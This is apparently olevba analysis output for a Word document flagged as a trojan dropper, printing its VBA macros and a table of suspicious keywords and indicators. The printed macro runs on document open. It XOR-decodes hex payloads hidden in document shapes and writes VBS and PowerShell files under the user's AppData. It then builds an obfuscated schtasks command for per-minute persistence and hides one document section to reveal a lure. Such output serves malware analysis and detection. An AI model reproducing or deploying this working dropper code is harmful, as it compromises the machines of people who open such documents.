olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Dropper.MSOffice.SDrop.gen_1ec6b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan-Dropper.MSOffice.SDrop.gen_1ec6b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub ShowMainTexts()

    ActiveDocument.Sections(1).Range.Font.Hidden = True
    ActiveDocument.Sections(2).Range.Font.Hidden = False
    
    ThisDocument.Save
    
End Sub




Private Sub Document_Open()
    Call Init
    Call ShowMainTexts
    
End Sub


Sub Init()
    
    On Error Resume Next
    
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set wss = CreateObject("WScript.Shell")
    
    vc = ActiveDocument.Shapes(2).TextFrame.TextRange.Text
    vp = ActiveDocument.Shapes(3).TextFrame.TextRange.Text
    vd = ActiveDocument.Shapes(1).TextFrame.TextRange.Text
    

    up_path = wss.ExpandEnvironmentStrings("%userprofile%")
    dest_path = up_path & "\appdata\local\microsoft\Feed\"
    vbfilename = "k674312.vbs"


    If Not (fso.FolderExists(dest_path)) Then
        fso.CreateFolder (dest_path)
    End If

    fso.CreateFolder (dest_path & "dn")
    fso.CreateFolder (dest_path & "up")

    Set objTextFile = fso.OpenTextFile(dest_path & vbfilename, 2, True) '

    k = 19
    objTextFile.Write ("filename = """ & dest_path & "in.txt"" ")
    vcd = ""
    
    For i = 1 To Len(vc) / 2
        ind = i * 2 - 1
        vcd = vcd + Chr(CInt("&H" + (Mid(vc, ind, 2))) Xor k)
    
        objTextFile.Write (vcd)
        vcd = ""

    Next

    objTextFile.Close
    
    Set objTextFile3 = fso.OpenTextFile(dest_path & "in.txt", 2, True)
    k = 19
    vdd = ""
    For i = 1 To Len(vd) / 2
        ind = i * 2 - 1
        vdd = vdd + Chr(CInt("&H" + (Mid(vd, ind, 2))) Xor k)
        
        objTextFile3.Write (vdd)
        vdd = ""
    Next
    objTextFile3.Close

    Set objTextFile2 = fso.OpenTextFile(dest_path & "tm.ps1", 2, True)
    
    k = 19
    
    vpd = ""
    
    For i = 1 To Len(vp) / 2
        ind = i * 2 - 1
        vpd = vpd + Chr(CInt("&H" + (Mid(vp, ind, 2))) Xor k)
        
        objTextFile2.Write (vpd)
        vpd = ""
    
    Next
    
    objTextFile2.Close
    
    dst1 = "sc"
    dst7 = "/s"
    dst4 = " /cr"
    dst8 = "c mi"
    dst2 = "hta"
    dst9 = "nute /m"
    dst5 = "eat"
    dst10 = "o 2 /t"
    dst3 = "sks"
    dst11 = "n ""lo"" /t"
    dst6 = "e /F "
    dst12 = "r "

    dst = dst1 & dst2 & dst3 & dst4 & dst5 & dst6 & dst7 & dst8 & dst9 & dst10 & dst11 & dst12
    
    wss.Run dst & """'wscript.exe' '" & dest_path & vbfilename & "'""", 0

End Sub




-------------------------------------------------------------------------------
VBA MACRO Class1.cls 
in file: HEUR-Trojan-Dropper.MSOffice.SDrop.gen_1ec6b - OLE stream: 'Macros/VBA/Class1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |k674312.vbs         |Executable file name                         |
|IOC       |tm.ps1              |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

